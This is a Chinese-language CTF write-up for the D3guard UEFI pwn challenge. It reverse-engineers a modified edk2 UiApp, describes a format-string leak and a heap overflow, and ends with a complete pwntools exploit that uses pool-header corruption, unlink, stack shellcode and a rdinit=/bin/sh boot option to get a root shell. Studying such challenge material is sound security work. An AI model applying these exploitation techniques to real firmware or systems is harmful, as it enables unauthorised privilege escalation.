@@ -1,0 +1,538 @@
+---
+layout: post
+title:  D3guard(N1CTF2022)
+date:   2024-12-19 00:08:01 +0300
+image:  2024-12-19-woman.jpg
+tags:   [ctf,Pwn,UEFI,heap]
+---
+
+#### 1. Analysis
+
+观察启动脚本的参数可以发现，QEMU在启动时向pflash（可以看成是bios）写入了一个叫做OVMF.fd的固件，并且将`./content`目录挂载为了一个fat格式的驱动器。熟悉UEFI开发的选手应该很快可以想到这是一个UEFI PWN，即通过UEFI环境下的漏洞利用完成提权
+
+```assembly
+ret = subprocess.call([
+    "qemu-system-x86_64",
+    "-m", f"{256+random.randint(0, 512)}",
+    "-drive", f"if=pflash,format=raw,file=OVMF.fd",
+    "-drive", "file=fat:rw:contents,format=raw",
+    "-net", "none",
+    "-monitor", "/dev/null",
+    "-nographic"
+], stderr=subprocess.DEVNULL)
+```
+
+> 题目源文件的所有改动基于edk2项目：[https://github.com/tianocore/edk2](https://github.com/tianocore/edk2)
+
+运行启动脚本且不做任何操作将会直接进入操作系统，并切换到低权限用户。该用户没有根目录下flag文件的读权限。结合题目描述中的`cat /flag`可以得知需要进行某种方式的提权以读取flag内容
+
+```assembly
+/ $ ls -al /flag
+-r--------    1 0        0               25 Feb 17 17:33 /flag
+/ $ id
+uid=1000 gid=1000 groups=1000
+```
+
+正常情况下，edk2会提供UI和EFI SHELL两种交互方式让用户运行EFI程序或者进行Boot参数的相关设置。检查`boot.nsh`可以发现默认情况下内核的启动参数为：`bzImage console=ttyS0 initrd=rootfs.img rdinit=/init quiet`，也就是说，如果我们能够进入UI或者EFI SHELL交互界面，然后修改Boot参数为`bzImage console=ttyS0 initrd=rootfs.img rdinit=/bin/ash quiet`就可以以root shell的方式进入操作系统，读取flag文件。
+
+但是留意启动过程的输出会发现，进入EFI SHELL前的倒计时直接被掠过了（因为把入口逻辑patch掉了）。于是只能尝试去进入UI交互界面。edk2进入UI交互界面的快捷键为F2（或F12），在启动时长按该按键即可进入UI交互程序。然而在本题中，并不会直接进入Ui交互界面，而是先进入了d3guard子程序，如下：
+
+```assembly
+BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
+BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
+```
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/fpyojin.png)
+
+#### 2. Reverse
+
+现在首要任务就是对`UiApp`进行逆向分析寻找能够进入正常Ui交互的方式。
+
+> uefi-firmware-parser -ecO ./OVMF.fd
+
+```assembly
+> grep -lr "Please select your role"
+
+```
+
+借助一些工具可以轻松地将`UiApp`模块镜像提取出来，这里使用的是：https://github.com/yeggor/uefi_retool
+
+通过逆向可以发现两个主要的漏洞，一个是尝试用Administrator身份登录时，存在一个格式化字符串漏洞，该漏洞可以泄露栈上的地址信息，包括镜像地址和栈地址：
+
+> 一些队伍由于没注意到关于这个漏洞的hint导致差一点没拿到flag，深感可惜😭！！！
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/DfCEqEY.png)
+
+泄露地址：0x2cfc13f5
+
+实际地址：0x173f5
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/addr.png)
+
+还有一个漏洞是在编辑用户描述信息的时候存在堆溢出（这一点大部分队伍都发现了）：
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/Xhubiq9.png)
+
+除了对于`UiApp`镜像的逆向分析，还需要阅读edk2中AllocatePool的具体实现方式，这关系到漏洞利用的一些细节，这部分暂时省略
+
+> 相关代码位于：https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Mem/Pool.c
+
+#### 3. Exploit
+
+通过动态调试发现，`1. New Visitor`之后，`visitor->name`和`visitor->desc`位于相邻的内存区间上，将两者调换位置让`visitor->desc`位于低地址处，即可通过堆溢出漏洞覆盖`visitor->desc`的`POOL_TAIL`和`visitor->name`的`POOL_HEAD`
+
+> 主要关注POOL_HEAD结构体
+
+```assembly
+#define POOL_HEAD_SIGNATURE      SIGNATURE_32('p','h','d','0')
+typedef struct {
+  UINT32             Signature;
+  UINT32             Reserved;
+  EFI_MEMORY_TYPE    Type;
+  UINTN              Size;
+  CHAR8              Data[1];
+} POOL_HEAD;
+
+#define POOL_TAIL_SIGNATURE  SIGNATURE_32('p','t','a','l')
+typedef struct {
+  UINT32    Signature;
+  UINT32    Reserved;
+  UINTN     Size;
+} POOL_TAIL;
+```
+
+new_info
+
+```assembly
+__int64 __fastcall new_info()
+{
+  unsigned int v0; // er12
+  UINT32 v1; // edx
+  void *v2; // rcx
+  UINT32 v3; // edx
+  CHAR16 *v4; // rcx
+  UINT32 v5; // edx
+  CHAR16 *v6; // rcx
+
+  LOBYTE(v0) = 1;
+  if ( !visitor )
+  {
+    ((void (__fastcall *)(_QWORD, __int64, VISITOR_INFO **))gBS->AllocatePool)(0i64, 24i64, &visitor);
+    if ( !visitor )
+      goto LABEL_3;
+    bzero(v2, v1);
+    Print(L"ID: ");
+    visitor->id = (int)wget_int();
+    ((void (__fastcall *)(_QWORD, __int64, CHAR8 **))gBS->AllocatePool)(0i64, 24i64, &visitor->name);
+    if ( !visitor->name )
+      goto LABEL_3;
+    Print(L"Name: ");
+    wgets(v4, v3);
+    UnicodeStrToAsciiStrS(&glo_buf, visitor->name, 24i64);
+    ((void (__fastcall *)(_QWORD, __int64, CHAR8 **))gBS->AllocatePool)(0i64, 56i64, &visitor->desc);
+    if ( visitor->desc )
+    {
+      Print(L"Desc: ");
+      wgets(v6, v5);
+      UnicodeStrToAsciiStrS(&glo_buf, visitor->desc, 56i64);
+    }
+    else
+    {
+LABEL_3:
+      v0 = 0;
+    }
+  }
+  return v0;
+}
+```
+
+clear_info
+
+```assembly
+char clear_info()
+{
+  char result; // al
+  VISITOR_INFO *v1; // rax
+
+  result = 0;
+  if ( visitor && visitor->name )
+  {
+    if ( visitor->desc )
+    {
+      ((void (*)(void))gBS->FreePool)();
+      v1 = visitor;
+      visitor->name = 0i64;
+      ((void (__fastcall *)(CHAR8 *))gBS->FreePool)(v1->desc);
+      visitor->desc = 0i64;
+      result = 1;
+    }
+  }
+  return result;
+}
+```
+
+​	结合对AllocatePool相关源代码的阅读，发现当调用`FreePool`函数时，edk2会根据`POOL_HEAD->EFI_MEMORY_TYPE`的不同而将堆块放入不同的链表中，而分配`visitor->name`和`visitor->desc`时，AllocatePool参数所用的`EFI_MEMORY_TYPE`为`EfiReservedMemoryType`（即常数0）。如果通过溢出修改`visitor->name`的`POOL_HEAD->EFI_MEMORY_TYPE`为别的值，即可将其放入其它链表中，再次申请也不会被取出。
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/13bukEs.png)
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/aaLRcqD.png)
+
+
+最后在`4. Confirm && Enter OS`中还会分配一次堆内存，用于拷贝`visitor->name`和`visitor->desc`并保存。这时候`AllocatePool()`所申请的`EFI_MEMORY_TYPE`为`EfiACPIMemoryNVS`（即常数10）。
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/bNrOtQr.png)
+
+结合上面的分析，将`visitor->name`的`POOL_HEAD->EFI_MEMORY_TYPE`设置为10，并将其Free。此时原先分配给`visitor->name`的堆块进入了空闲链表（这是个双链表），通过劫持双链表的FD和BK指针可以向任意地址写一个自定义的值。
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/before.png)
+
+visitor之后变为
+
+![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/d3guard/after.png)
+
+结合最开始泄露出的栈地址，我们可以将d3guard函数的返回地址覆盖掉以劫持程序流。
+
+> 实际上最后一步的解法是开放性的，只要达到劫持控制流的目的就行
+
+由于`d3guard()`的上层函数`_ModuleEntryPoint+718`的位置会判断`d3guard()`的返回值以决定是否进入UI交互界面，所以最直接的做法是覆盖d3guard返回地址跳过if分支直接进入UI交互界面。
+
+> .text:000000000000B96B                 call    d3guard
+> .text:000000000000B970                 test    eax, eax
+> .text:000000000000B972                 jnz     loc_CB92
+> .text:000000000000B978                 mov     edx, 3050007h
+> .text:000000000000B97D                 mov     ecx, 1
+> .text:000000000000B982                 call    sub_6107
+
+但是实际编写脚本时发现泄露出的程序地址与跳转的目标地址偏移不是很稳定（但是概率很大），于是覆盖d3guard返回地址为一个栈上shellcode的地址（栈上没开NX防护），shellcode可以在输入Admin pass key时提前部署。借助shellcode以及寄存器中的镜像地址，可以计算出稳定的跳转目标地址。
+
+成功进入Ui交互界面后，只需要通过操作菜单添加一个新的启动项，并将参数`rdinit`设置为`/bin/sh`然后通过其进入操作系统，即可获得root权限。
+
+```assembly
+#!/usr/bin/python3
+# ************************************************ #
+# AntCTF x D^3CTF 2022                             #
+# Type: Pwnable                                    #
+# Chall: d3guard                                   #
+# Author: Eqqie (https://github.com/yikesoftware/) #
+# ************************************************ #
+from pwn import *
+import os
+import sys
+import random
+
+context.arch = "amd64"
+remote_addr = ("1-lb-pwn-challenge-cluster.d3ctf.io", 32659)
+test_token = b"Sdtwx24ticC608cDjeeK35700MgHXh5D"
+
+if len(sys.argv) != 2:
+    print("python3 exp.py <remote-socat|remote-debug|remote-nodebug|local-socat|local-nodebug|local-debug>")
+    sys.exit(0)
+mode = sys.argv[1]
+# remote
+if mode == "remote-socat":
+    os.system("clear")
+    os.system(
+        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} remote-nodebug\" 2>&1")
+    sys.exit(0)
+elif mode == "remote-debug":
+    context.log_level = "debug"
+    do_proof = True
+    p = remote(remote_addr[0], remote_addr[1])
+elif mode == "remote-nodebug":
+    do_proof = True
+    p = remote(remote_addr[0], remote_addr[1])
+# lcoal
+elif mode == "local-socat":
+    os.system("cp OVMF.fd.bak OVMF.fd")
+    os.system(
+        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} local-nodebug\" 2>&1")
+elif mode == "local-debug":
+    do_proof = False
+    os.system("cp OVMF.fd.bak OVMF.fd")
+    p = process([
+        "qemu-system-x86_64",
+        "-s",
+        "-m", f"{256+random.randint(0, 512)}",
+        "-drive", "if=pflash,format=raw,file=OVMF.fd",
+        "-drive", "file=fat:rw:contents,format=raw",
+        "-net", "none",
+        "-nographic"
+    ])
+elif mode == "local-nodebug":
+    do_proof = False
+    os.system("cp OVMF.fd.bak OVMF.fd")
+    p = process([
+        "qemu-system-x86_64",
+        "-m", f"{256+random.randint(0, 512)}",
+        "-drive", "if=pflash,format=raw,file=OVMF.fd",
+        "-drive", "file=fat:rw:contents,format=raw",
+        "-net", "none",
+        "-monitor", "/dev/null",
+        "-nographic"
+    ])
+
+
+def new_visitor(_id: int, name, desc):
+    p.sendafter(b">> ", b"1\r")
+    p.sendafter(b"ID: ", str(_id).encode()+b"\r")
+    p.sendafter(b"Name: ", name+b"\r")
+    p.sendafter(b"Desc: ", desc+b"\r")
+
+
+def edit(target, content):
+    p.sendafter(b">> ", b"2\r")
+    if target == 1 or target == "name":
+        p.sendafter(b">> ", b"1\r")
+        p.sendafter(b"Name: ", content+b"\r")
+    if target == 2 or target == "desc":
+        p.sendafter(b">> ", b"2\r")
+        p.sendafter(b"Desc: ", content+b"\r")
+
+
+def clear():
+    p.sendafter(b">> ", b"3\r")
+
+
+key_map = {
+    "up":    b"\x1b[A",
+    "down":  b"\x1b[B",
+    "left":  b"\x1b[D",
+    "right": b"\x1b[C",
+    "esc":   b"\x1b^[",
+    "enter": b"\r",
+    "tab":   b"\t"
+}
+
+
+def send_key(_key: str, times: int = 1):
+    for _ in range(times):
+        p.send(key_map[_key])
+
+
+def exp():
+    # team token
+    if do_proof:
+        print("test_token:", test_token)
+        p.sendlineafter(b"Input your team token:", test_token)
+
+    # into 'UiAPP'
+    p.recv(1)
+    p.send(b'\x1b[24~'*20)
+
+    # leak image_addr & stack_addr
+    p.sendafter(b"Visitor): ", b"1\r")
+    p.sendafter(b"Username: ",
+                b"|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\r")
+    p.recvuntil(b"User [")
+    for _ in range(5):
+        p.recvuntil(b"|")
+    stack_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
+    print(hex(stack_leak))
+    for _ in range(11):
+        p.recvuntil(b"|")
+    image_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
+    print(hex(image_leak))
+
+    # raw_input()
+
+    app_base = image_leak-0x173f5
+
+    # write null-off shellcode
+    p.sendafter(b"Visitor): ", b"1\r")
+    p.sendafter(b"Username: ", b"Admin\r")
+    shellcode = asm('''
+    jmp JUMP;
+    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
+    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
+    JUMP:
+        mov rax, r15;
+        mov rbx, 0x1461e11;
+        shr rbx, 8;
+        sub rax, rbx;
+        jmp rax;
+    ''')
+    # .text:00000000000003EC                 call    sha256_update
+    # break here to check rdi value
+    # b *(-0x173f5+0x3EC)
+    # raw_input()
+
+    p.sendafter(b"Pass key: ", shellcode+b"\r")
+
+    # raw_input()
+    '''
+    leak - real
+    >>> hex(0x282bebd2-0x282ae6cf)
+    '0x10503'
+    '''
+
+    # into visitor system
+    p.sendafter(b"Visitor): ", b"2\r")
+
+    # .data:00000000000208E0 visitor         dq 0
+    # 
+
+    # new
+    new_visitor(1, b"yama", b"a")
+
+    # raw_input()
+    '''
+    gdb-peda$ x/90gx 0x000000002a552018
+    0x2a552018:     0x0000000000000001      0x000000002a552f18
+    0x2a552028:     0x000000002a552f98      0xafafafaf6c617470
+
+    gdb-peda$ x/90gx 0x000000002a552f18-0x10
+    0x2a552f08:     0x0000000000000000      0x0000000000000040
+    0x2a552f18:     0xafafaf00616d6179      0xafafafafafafafaf data[0x18]
+    0x2a552f28:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
+    0x2a552f38:     0x0000000000000040      0xafafafafafafafaf
+    0x2a552f48:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552f58:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552f68:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552f78:     0xafafafafafafafaf      0x0000000030646870 phd0
+    0x2a552f88:     0x0000000000000000      0x0000000000000060
+    0x2a552f98:     0xafafafafafaf0061      0xafafafafafafafaf data[0x38]
+    0x2a552fa8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552fb8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552fc8:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
+    0x2a552fd8:     0x0000000000000060      0xafafafafafafafaf
+    0x2a552fe8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a552ff8:     0xafafafafafafafaf      0x000000002a559a9d
+    0x2a553008:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x2a553018:     0xafafafafafafafaf      0xafafafafafafafaf
+    '''
+
+    clear()
+    edit("name", b"yama")
+    edit("desc", b"aaa")
+
+    # raw_input()
+    '''
+    gdb-peda$ x/90gx 0x0000000018352f18-0x10
+    0x18352f08:     0x0000000000000000      0x0000000000000060 desc
+    0x18352f18:     0xafafafaf00616161      0xafafafafafafafaf
+    0x18352f28:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352f38:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352f48:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
+    0x18352f58:     0x0000000000000060      0xafafafafafafafaf
+    0x18352f68:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352f78:     0xafafafafafafafaf      0x0000000030646870 phd0
+    0x18352f88:     0x0000000000000000      0x0000000000000040
+    0x18352f98:     0xafafaf00616d6179      0xafafafafafafafaf yama
+    0x18352fa8:     0xafafafafafafafaf      0xafafafaf6c617470
+    0x18352fb8:     0x0000000000000040      0xafafafafafafafaf
+    0x18352fc8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352fd8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352fe8:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18352ff8:     0xafafafafafafafaf      0x0000000018359a9d
+    0x18353008:     0xafafafafafafafaf      0xafafafafafafafaf
+    0x18353018:     0xafafafafafafafaf      0xafafafafafafafaf
+    '''
+    
+    
+    # modify POOL_HEAD.Type
+    # part3
+    part3 = b""
+    part3 += p64(0x40)[0:7]  # POOL_HEAD.Size
+    edit("desc", b"\xaf"*(0x7f-len(part3))+part3)
+    # part2
+    part2 = b""
+    part2 += b"\xaf"*0x20  # pad
+    part2 += p32(0x30646870)  # POOL_HEAD.Signature
+    part2 += b"\xaf\xaf\xaf\xaf"  # POOL_HEAD.Reserved
+    part2 += p8(10)  # POOL_HEAD.Type (EfiACPIMemoryNVS)
+    # write 0xaf
+    for i in range(6, -1, -1):
+        tmp = part2+b"\xaf"*i
+        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7)+tmp)
+    # part1
+    part1 = b""
+    part1 = part1.ljust(0x38, b"\xaf")
+    part1 += b"ptal"  # POOL_TAIL.Signature
+    part1 += b"\xaf"*4  # POOL_TAIL.Reserved
+    part1 += p8(0x60)  # POOL_TAIL.Size
+    for i in range(6, -1, -1):
+        tmp = part1+b"\xaf"*i
+        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7-len(part1)-7)+tmp)
+    # Put 'name' into other free list
+    clear()
+
+    # poison unlink
+    edit("desc", b"aaa")
+    edit("name", b"eqqie")
+    clear()
+    edit("desc", b"bbb")
+    edit("name", b"eqqie")
+
+    # x/10gx *(-0x173f5+0x208E0)
+    # raw_input()
+    
+
+    # calc addr
+    ret_addr = stack_leak-0x104ba
+    stack_shellcode = ret_addr-0x49
+    # part4(BK)
+    part4 = p32(ret_addr)
+    edit("desc", b"\xaf"*0x78+part4)
+    # part3(FD)
+    part3 = p32(stack_shellcode)
+    for i in range(3, -1, -1):
+        tmp = part3+b"\xaf"*i
+        edit("desc", b"\xaf"*0x70+tmp)
+    # part2
+    part2 = b"pfr0"
+    for i in range(3, -1, -1):
+        tmp = part2+b"\xaf"*i
+        edit("desc", b"\xaf"*0x68+tmp)
+    # part1
+    part1 = b"\xaf"*0x38
+    part1 += b"ptal"+b"\xaf"*4
+    part1 += p8(0x60)
+    for i in range(6, -1, -1):
+        tmp = part1+b"\xaf"*i
+        edit("desc", tmp)
+
+    # return to UiAPP
+    p.sendafter(b">> ", b"4\r")
+    print("app_base:", hex(app_base))
+    print("ret_addr:", hex(ret_addr))
+    print("stack_shellcode:", hex(stack_shellcode))
+
+    p.send(b"\r")
+
+    # Add new boot option
+    p.recvuntil(b"Standard PC")
+    send_key("down", 3)
+    send_key("enter")
+    send_key("enter")
+    send_key("down")
+    send_key("enter")
+    send_key("enter")
+    send_key("down", 3)
+    send_key("enter")
+    p.send(b"\rrootshell\r")
+    send_key("down")
+    p.send(b"\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r")
+    send_key("down")
+    send_key("enter")
+    send_key("up")
+    send_key("enter")
+    send_key("esc")
+    send_key("enter")
+    send_key("down", 3)
+    send_key("enter")
+
+    # root shell
+    # p.sendlineafter(b"/ #", b"cat /flag")
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exp()
+```
+
+> 开始没想到加启动项这个步骤也能成为一个坑点...其实可以编译一份原版OVMF.fd，进入`Boot Maintenance Manager`，进入` Boot Options`，选择`Add Boot Option`，选择内核镜像`bzImage`，设置启动项名称`rootshell`，设置内核启动的附加参数`console=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet`，最后返回主页面选择启动项菜单，找到`rootshell`这一项
+
+参考：
+
+https://eqqie.cn/index.php/archives/1929
+
